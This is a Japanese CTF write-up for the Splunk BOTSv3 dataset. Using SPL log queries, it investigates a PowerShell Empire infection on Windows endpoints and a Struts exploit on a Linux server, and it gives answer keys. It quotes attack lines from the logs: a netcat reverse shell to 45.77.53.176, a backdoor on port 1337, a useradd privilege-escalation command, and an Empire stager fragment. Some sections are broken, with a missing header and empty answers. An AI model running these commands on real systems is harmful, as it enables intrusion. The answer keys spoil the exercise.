== BOTSv3 (2): Windows 端末と Linux サーバーの侵害

=== シナリオ

2018 年 8 月 20 日，Frothly の社内で次の 2 つの侵害が並行して起きた．

* Windows 端末：OneDrive で共有された不審なショートカット（`.lnk`）を起点に，PowerShell のバックドアが動き，C&C サーバーと通信した（メールで届いたマクロ付き Excel は検知・削除された）
* Linux サーバー `hoth`：Web アプリ（Apache Struts）の脆弱性を突かれてコマンドを実行され，ユーザーの作成や権限昇格が行われた

この章では問題 2300〜2313 を扱う．
主に使うデータは次のとおり．

* `ms:o365:management`：Office 365（OneDrive）の監査ログ
* `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` / `WinEventLog:Security`：Windows 端末のログ
* `osquery:results`：Linux サーバー `hoth` のプロセス・ファイル・ポートの記録
* `stream:http`：HTTP 通信（Struts への攻撃リクエストを含む）

[[q2300]]
=== 2300: OneDrive に悪性ショートカットをアップロードした User-Agent

[quote]
____
What is the full user agent string that uploaded the malicious link file to OneDrive?
____

配点：15 点

.方針
Office 365 の監査ログで，`.lnk` ファイルのアップロード（`Operation=FileUploaded`）を探す．

[source,spl]
----
index=botsv3 sourcetype=ms:o365:management Operation=FileUploaded *.lnk
| table _time UserId SourceFileName UserAgent
----

09:57:33 に `bgist@froth.ly` のアカウントで `BRUCE BIRTHDAY HAPPY HOUR PICS.lnk` がアップロードされている．
User-Agent の `ko-KP`（朝鮮語・北朝鮮）と `NaenaraBrowser`（北朝鮮製のブラウザ）から，
本人ではなく攻撃者がアカウントを使ってアップロードしたと考えられる．

TIP: Symantec はこのファイルを `Backdoor.PsEmpire` として検知している．
`index=botsv3 sourcetype=symantec:ep:risk:file | table _raw`

.答え
[%collapsible.answer]
====
`Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4`
====

[[q2302]]
=== 2302: マルウェアに埋め込まれていた実行ファイル

[quote]
____
What is the name of the executable that was embedded in the malware? Include the file extension.
____

配点：10 点

.方針
問題の「マルウェア」は，`bgist` のメールに添付されていたマクロ付き Excel（`W97M.Empstage`）である．
Symantec の検知記録と，Sysmon のファイル作成記録を調べる．

まず，Symantec による検知を探す．

[source,spl]
----
index=botsv3 (Empstage OR xlsm) sourcetype!=*o365*
| table _time host sourcetype _raw
----

`BGIST-L` で次の検知が出ている．

----
Security Risk Found! W97M.Empstage in File: C:\Users\BruceGist\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\3\Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm by: Auto-Protect scan.  Action: Cleaned by Deletion.
----

同じファイルの作成（Sysmon の `EventCode` 11）を見ると，ファイルを書き込んだプロセス（`Image`）が分かる．

[source,spl]
----
index=botsv3 host=BGIST-L sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 TargetFilename=*.xlsm
| sort _time
| table _time Image TargetFilename
----

[cols="1,3,3", options="header"]
|===
|`_time` |`Image` |`TargetFilename`
|09:55:52 |`C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_...\HxTsr.exe` |`...\Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm`
|09:55:54 |`System` |`C:\ProgramData\Symantec\...\Quarantine\AP4D3C539B.xlsm`
|===

マルウェア（`.xlsm`）を作成した実行ファイルは `HxTsr.exe` である．これが出題者の想定する答えである．

NOTE: 解答者 4 チームはいずれもこの問題を解けなかった．
`HxTsr.exe` は Windows 10 標準の「メール」アプリの同期プロセスで，メールの添付ファイルを保存したのはこのプロセスである．
厳密には「マルウェアに埋め込まれていた」実行ファイルではなく，問題文と証拠の対応はあいまいである．
`HxTsr.exe` は全端末で正規のプロセスとして大量に記録されているため，単純な検索では見つけにくい．
「マルウェア本体のファイルに関するイベントを起点に，関係するプロセスをたどる」と考えるとたどり着ける．

TIP: このメールの経緯は他のログでも追える．
メールの配送記録（`ms:o365:reporting:messagetrace`）には `bgist@froth.ly` から 4 人に送られた件名 `Draft Financial Plan for Brewery FY2019` があり，
`stream:smtp` の同じメールでは，添付ファイルが「`Malware Alert Text.txt`」（Base64）に置き換えられている．
デコードすると，添付の `Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm` が `W97M.Empstage` として削除された旨が書かれている．

WARNING: `powershell.exe`，`iexeplorer.exe`，`browser_broker.exe` などを答えて外したチームが多い．
これらは攻撃の後段で使われたプロセスで，Excel ファイルとは直接関係しない．

.答え
[%collapsible.answer]
====
`HxTsr.exe`
====

[[q2303]]
=== 2303: root が Linux 上で作成したユーザーのパスワード

[quote]
____
What is the password for the user that was successfully created by root on the on-premises Linux system?
____

配点：15 点

.方針
オンプレミスの Linux サーバーは `hoth` である．
osquery のプロセス記録で `useradd` のコマンドラインと，実行したユーザーの UID を確かめる．

[source,spl]
----
index=botsv3 host=hoth sourcetype=osquery:results useradd
| spath path=columns.cmdline output=cmd
| spath path=columns.uid output=uid
| search cmd=*
| stats count by cmd uid
----

[cols="4,1", options="header"]
|===
|`cmd`（引用符を除いて示す） |`uid`
|`useradd -ou tomcat7 -p davidverve.com 0 -g 0 -M -N -r -s /bin/bash` |111
|`useradd -ou tomcat7 -p ilovedavidverve 0 -g 0 -M -N -r -s /bin/bash` |**0**
|===

1 回目（11:08）は Web アプリの権限（UID 111，Tomcat）で実行されて失敗し，2 回目（11:24）は権限昇格（2402）の後に root（UID 0）で実行されている．
root が実行したコマンドの `-p` に渡されたのは `ilovedavidverve` である．

WARNING: Struts への HTTP リクエスト（2403）に含まれる `useradd` は 1 回目の `davidverve.com` である．
HTTP の記録だけを見ると誤った答えになる．「root が成功させた」ものを osquery の UID で確かめること．

NOTE: 通常 `useradd -p` には暗号化済みのパスワードを渡す．ここでは問題の意図どおり，渡された文字列を答える．

.答え
[%collapsible.answer]
====
`ilovedavidverve`
====

[[q2306]]
=== 2306: leet ポートで待ち受けているプロセスの PID

[quote]
____
What is the process ID of the process listening on a leet port?
____

配点：10 点

.方針
「leet」は 1337 番ポートのことである．osquery の待ち受けポートの記録（`listening_ports`）で 1337 番を探す．

[source,spl]
----
index=botsv3 host=hoth sourcetype=osquery:results name=*listening_ports*
| spath path=columns.port output=port
| spath path=columns.pid output=pid
| search port=1337
| stats count by port pid
----

PID は `14356` である．
プロセスの記録で確かめると，`netcat` が 1337 番で待ち受け，接続にシェルを渡す設定になっている（バックドア）．

[source,spl]
----
index=botsv3 host=hoth sourcetype=osquery:results 14356
| spath path=columns.pid output=pid
| spath path=columns.cmdline output=cmd
| search pid=14356 cmd=*netcat*
| stats count by pid cmd
----

.答え
[%collapsible.answer]
====
`14356`
====

[quote]
____
What is the MD5 value of the file downloaded to Fyodor's endpoint system and used to scan Frothly's network?
____

配点：15 点

.方針
Fyodor の端末 `FYODOR-L` のプロセス生成を見て，IP アドレスの範囲を引数に取るツールを探す．

[source,spl]
----
index=botsv3 host=FYODOR-L sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 Image=*hdoor.exe

----

----
"C:\windows\temp\hdoor.exe" -hbs 192.168.9.1-192.168.9.50 /b /m /n

TIP: 見当がつかないときは，`stats count values(CommandLine) by Image` で端末上の実行ファイルを一覧にし，
`C:\Windows\Temp` のような一時フォルダーから実行されたものに注目するとよい．

.答え
[%collapsible.answer]
====
`586EF56F4D8963DD546163AC31C865D7`

=== 2309: 攻撃ツールが入っていたと推定されるファイル

[quote]
____
Based on the information gathered, what file can be inferred to contain the attack tools?
____

配点：10 点

.方針
2308 でダウンロードされたファイルと，その直後に端末に現れたファイルを比べる．

[source,spl]
----
index=botsv3 host=FYODOR-L sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 TargetFilename="C:\\Windows\\Temp\\*"
| stats min(_time) as first by Image TargetFilename
| sort first
| eval first=strftime(first, "%T")
----

Sysmon で 3333 番への接続が記録された 10:47:06 の約 35 秒後（10:47:41）に，PowerShell が `C:\Windows\Temp\unziped\lsof-master\` の下に
`iexeplorer.exe` などを作っている．
なお `stream:http` では応答の完了時刻が記録されるため，`logos.png` の取得は 10:47:16 と表示される．
`unziped` というフォルダー名から，画像ファイルに見せかけた `logos.png` の実体はツールを詰めたアーカイブだったと推定できる．

.答え
[%collapsible.answer]

[[q2310]]
=== 2310: Linux サーバーの `/tmp` に送り込まれた 2 つのファイル

[quote]
____
During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server. What are their names? Comma separated without spaces, in alphabetical order.
____

配点：15 点

.方針
osquery のファイル監視で，`hoth` の `/tmp` に作られたファイルを時系列に並べる．
システムが定期的に作る一時ファイル（`tmpf*`，`systemd-private*`，`sh-thd*`）は除く．

[source,spl]
----
index=botsv3 host=hoth sourcetype=osquery:results "/tmp/"
| spath path=columns.target_path output=path
| spath path=columns.action output=action
| search path=/tmp/* action=CREATED NOT path="/tmp/tmpf*" NOT path="/tmp/systemd-private*" NOT path="/tmp/sh-thd*"
| stats min(_time) as first by path
| sort first
| eval first=strftime(first, "%T")
----

[cols="2,1,3", options="header"]
|===
|`path` |`first` |由来
|`/tmp/colonel` |11:09:07 |**外部から送り込まれた**（Struts 経由の `echo <Base64> >> /tmp/colonel`）
|`/tmp/backpipe` |11:13:57 |`mknod` で作った名前付きパイプ（リバースシェル用）
|`/tmp/colonel.c` |11:13:57 |`colonel` を `base64 --decode` したもの
|`/tmp/definitelydontinvestigatethisfile.sh` |11:13:57 |**外部から送り込まれた**（リバースシェル経由）
|`/tmp/cc*.o` など，`/tmp/colonelnew` |11:18:47 |`colonel.c` をコンパイルしたときの中間ファイルと生成物
|`/tmp/loot.txt`，`/tmp/suitecrm.sql`，`/tmp/blargh.tgz` |11:23〜11:42 |攻撃者がサーバー上で作った収集物
|===

外部から内容が流し込まれたのは `colonel` と `definitelydontinvestigatethisfile.sh` の 2 つである．
他はサーバー上の操作で派生したファイルである．

NOTE: osquery の `file_events` はまとめて記録されるため，`_time` は実際の操作より遅れることがある．
複数のファイルが同じ時刻（11:13:57）になっているのはこのためで，2402 で示すプロセス記録の時刻（`./colonelnew` の実行は 11:17）とも前後する．

攻撃者が送ったコマンドは，Struts への HTTP リクエストから読める（2403 も参照）．

[source,spl]
----
index=botsv3 sourcetype=stream:http uri_path=/frothlyinventory/integration/saveGangster.action
| rex field=form_data "#cmd='(?<cmd>[^']{0,100})"
| sort 0 _time
| table _time src_ip cmd
----

この中の `/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe` が，`backpipe` を使って `45.77.53.176` の 8088 番へリバースシェルをつなぐコマンドである．

.答え
[%collapsible.answer]
====
`colonel,definitelydontinvestigatethisfile.sh`

（順序を逆にした `definitelydontinvestigatethisfile.sh,colonel` も正解として受け付けられる）
====

[[q2312]]
=== 2312: C&C サーバーでアクセスされる URL のパス

[quote]
____
What is the path of the URL being accessed by the command and control server?
____

配点：10 点

.方針
Windows 端末で実行された，エンコードされた PowerShell（`-enc` オプション）をデコードして読む．

[source,spl]
----
index=botsv3 sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 Image=*powershell.exe CommandLine="*-enc*"
| stats count by host CommandLine
----

`powershell.exe -NoP -NonI -W Hidden -enc SQBGACgAJABQAFMA...` のようなコマンドが `ABUNGST-L`，`BSTOLL-L`，`FYODOR-L` で実行されている．
`-enc` の後ろは UTF-16LE の文字列を Base64 にしたものである．
CyberChef で「From Base64」→「Decode text（UTF-16LE）」の順に適用するか，次のように手元でデコードする．

[source,python]
----
import base64
encoded = "SQBGACgAJABQAFMA..."   # -enc の後ろの文字列
print(base64.b64decode(encoded).decode("utf-16le"))
----

デコードすると PowerShell Empire のステージャーが現れ，接続先とパスが次のように書かれている（`$ser` の値はさらに Base64 で包まれているため，デコードした後の値を示す）．

----
$ser='https://45.77.53.176:443';$t='/admin/get.php';
... $data=$WC.DownloadData($ser+$t) ...
----

IMPORTANT: デコードした PowerShell は読むだけにし，決して実行しないこと．

.答え
[%collapsible.answer]
====
`/admin/get.php`
====

=== 2313: C&C サーバーと通信した端末

[quote]
____
At least two Frothly endpoints contact the adversary's command and control infrastructure. What are their short hostnames? Comma separated without spaces, in alphabetical order.
____

配点：15 点

.方針
Sysmon のネットワーク接続（`EventCode` 3）で，C&C サーバー `45.77.53.176` への接続を端末ごとに数える．

[source,spl]
----
index=botsv3 sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 DestinationIp=45.77.53.176
| stats count by host Image DestinationPort
----

[cols="1,3,1,1", options="header"]
|===
|`host` |`Image` |`DestinationPort` |`count`
|`ABUNGST-L` |`...\powershell.exe` |443 |1,070
|`FYODOR-L` |`...\powershell.exe` |3333 |1
|`FYODOR-L` |`...\powershell.exe` |443 |3,849
|===

`ABUNGST-L` と `FYODOR-L` の PowerShell が継続的に C&C と通信している．

NOTE: `BSTOLL-L` でもエンコードされた PowerShell が実行されているが，C&C への接続は記録されていない．
「通信した（contact）」かどうかは，コマンドの存在ではなく接続の記録で判断する．

.答え
[%collapsible.answer]
====

（順序を逆にした `FYODOR-L,ABUNGST-L` も正解として受け付けられる）
====
